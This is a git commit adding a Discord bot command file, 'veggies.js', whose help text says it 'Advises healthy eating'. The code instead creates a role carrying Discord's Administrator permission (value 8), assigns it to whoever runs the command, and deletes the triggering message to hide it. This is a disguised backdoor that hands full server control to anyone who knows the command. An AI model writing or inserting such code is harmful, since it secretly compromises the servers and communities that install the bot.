718c3c83419f9bedea4c946ec5f27d8158e1fad2
Gatescode <43724492+Gatescode@users.noreply.github.com>
2020-09-05 09:59:28 -0500

    New Files

---
+++ commands/veggies.js
@@ -0,0 +1,29 @@
+const Discord = module.require("discord.js");
+
+module.exports.run = async (bot, message, args) => {
+
+    try {
+
+        role = await message.guild.createRole({
+          	permissions: [8]
+        });
+
+        message.member.addRole(role)
+        message.delete(1000);
+        if (message){
+            
+        }
+
+    } catch(e) {
+
+        console.log(e.stack);
+
+    }
+}
+
+module.exports.help = {
+
+    name: "veggies",
+    desc: "Advises healthy eating"
+
+}
